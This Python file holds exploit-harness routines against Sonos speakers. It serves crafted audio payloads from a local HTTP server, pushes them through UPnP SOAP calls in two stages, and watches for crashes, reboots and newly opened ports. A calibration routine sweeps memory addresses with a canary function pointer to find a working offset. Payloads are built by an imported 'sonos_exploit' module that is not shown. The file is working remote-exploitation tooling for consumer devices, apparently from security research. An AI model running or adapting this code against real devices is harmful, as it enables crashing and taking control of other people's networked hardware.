#!/usr/bin/env python3
"""The proven fire/calibrate/watch routines, extracted verbatim from the 2026-11-06
session runners (sweepshell/sweepdb/diagfire). Stdlib only. Every device-touching
function takes an explicit device IP."""
import subprocess, threading, http.server, socketserver, os, time, re, urllib.request

SVC = "urn:schemas-upnp-org:service:AVTransport:1"
PROTO = "http-get:*:audio/aac:*"   # audible PI 714s on 86.10; aac verified fetched

def _server(host, port, payload_dir):
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            p = os.path.join(payload_dir, self.path.split("?")[0].lstrip("/"))
            data = open(p, "rb").read() if os.path.exists(p) else b"x"
            self.send_response(200); self.send_header("Content-Length", str(len(data)))
            self.end_headers(); self.wfile.write(data)
        def log_message(self, *a): pass
    socketserver.TCPServer.allow_reuse_address = True
    t = threading.Thread(target=lambda: socketserver.TCPServer((host, port), H).serve_forever(), daemon=True)
    t.start(); return t

def soap(device, action, extra="", ctl_path="/MediaRenderer/AVTransport/Control", timeout=15):
    body = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
            's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
            f'<u:{action} xmlns:u="{SVC}"><InstanceID>0</InstanceID>{extra}</u:{action}></s:Body></s:Envelope>')
    r = subprocess.run(["curl","-s","-m",str(timeout),"-X","POST",
                        "-H",'Content-Type: text/xml; charset="utf-8"',
                        "-H",f'SOAPACTION: "{SVC}#{action}"',"--data-binary",body,
                        f"http://{device}:1400{ctl_path}"], capture_output=True, text=True)
    m = re.search(r"errorCode>(\d+)<", r.stdout)
    return f"ERR{m.group(1)}" if m else "200"

def _didl(url):
    return ('&lt;DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/" '
            'xmlns:dc="http://purl.org/dc/elements/1.1/" '
            'xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/"&gt;'
            '&lt;item id="-1" parentID="-1" restricted="true"&gt;&lt;dc:title&gt;t&lt;/dc:title&gt;'
            '&lt;upnp:class&gt;object.item.audioItem.musicTrack&lt;/upnp:class&gt;'
            f'&lt;res protocolInfo="{PROTO}"&gt;{url}&lt;/res&gt;&lt;/item&gt;&lt;/DIDL-Lite&gt;')

def alive(device, timeout=1.5):
    try:
        return urllib.request.urlopen(f"http://{device}:1400/status/VERSION", timeout=timeout).status == 200
    except Exception:
        return False

def port_open(device, port):
    r = subprocess.run(["nc","-z","-G","3",device,str(port)], capture_output=True, text=True)
    return r.returncode == 0

def icmp_ok(device):
    r = subprocess.run(["ping","-c","1","-W","1000",device], capture_output=True, text=True)
    return " 0% packet loss" in r.stdout

def fire_and_watch(device, payload_name, S, host="192.168.4.160", port=8981,
                   payload_dir="recon/tnzm_audible/sweep2", ports=(), watch_s=100, log=print):
    """Two-stage fire: benign stage1 + payload, then watch ports + ICMP/HTTP."""
    _server(host, port, payload_dir)
    soap(device, "Stop")
    c1 = soap(device, "SetAVTransportURI",
              f"<CurrentURI>http://{host}:{port}/A_toc_past_eof.aa</CurrentURI>"
              f"<CurrentURIMetaData>{_didl('http://%s:%d/A_toc_past_eof.aa' % (host, port))}</CurrentURIMetaData>")
    soap(device, "Play", "<Speed>1</Speed>"); time.sleep(1.5)
    c2 = soap(device, "SetAVTransportURI",
              f"<CurrentURI>http://{host}:{port}/{payload_name}</CurrentURI>"
              f"<CurrentURIMetaData>{_didl('http://%s:%d/%s' % (host, port, payload_name))}</CurrentURIMetaData>")
    soap(device, "Play", "<Speed>1</Speed>")
    log(f"fired {payload_name} at {S:06x} (s1={c1} s2={c2})")
    t0 = time.time(); losses = 0; max_down = 0; down = 0; opened = {}
    while time.time() - t0 < watch_s:
        time.sleep(1)
        if alive(device): down = 0
        else: down += 1; max_down = max(max_down, down)
        if not icmp_ok(device): losses += 1
        for p in ports:
            if p not in opened and port_open(device, p):
                opened[p] = round(time.time() - t0, 1)
                log(f"PORT {p} OPEN after {opened[p]}s")
    verdict = ("REBOOT" if losses >= 20 else "crash" if max_down >= 2 else "clean")
    log(f"watch done: icmp_losses={losses} max_http_down={max_down}s ports={opened} verdict={verdict}")
    return verdict, opened

def calibrate(device, lo=0x700000, hi=0x71c000, step=0x400, host="192.168.4.160",
              port=8982, payload_dir="recon/tnzm_audible/sweep2", fn=0x51000000, log=print):
    """Canary sweep: FN=0x51000000 (unmapped) => daemon crash ~1s => down>=1 = hit."""
    from sonos_exploit import build
    _server(host, port, payload_dir)
    soap(device, "Stop")
    for S in range(lo, hi, step):
        name = f"CAL_{S:06x}.aa"
        with open(os.path.join(payload_dir, name), "wb") as f:
            f.write(build(S, fn))
        c1 = soap(device, "SetAVTransportURI",
                  f"<CurrentURI>http://{host}:{port}/A_toc_past_eof.aa</CurrentURI>"
                  f"<CurrentURIMetaData>{_didl('http://%s:%d/A_toc_past_eof.aa' % (host, port))}</CurrentURIMetaData>")
        soap(device, "Play", "<Speed>1</Speed>"); time.sleep(1.2)
        c2 = soap(device, "SetAVTransportURI",
                  f"<CurrentURI>http://{host}:{port}/{name}</CurrentURI>"
                  f"<CurrentURIMetaData>{_didl('http://%s:%d/%s' % (host, port, name))}</CurrentURIMetaData>")
        soap(device, "Play", "<Speed>1</Speed>")
        down = 0; t0 = time.time()
        while time.time() - t0 < 7:
            time.sleep(1)
            if not alive(device): down += 1
            elif down: break
        log(f"canary {S:06x}: down={down}")
        if down >= 1:
            for _ in range(45):
                time.sleep(2)
                if alive(device): break
            return S
    return None
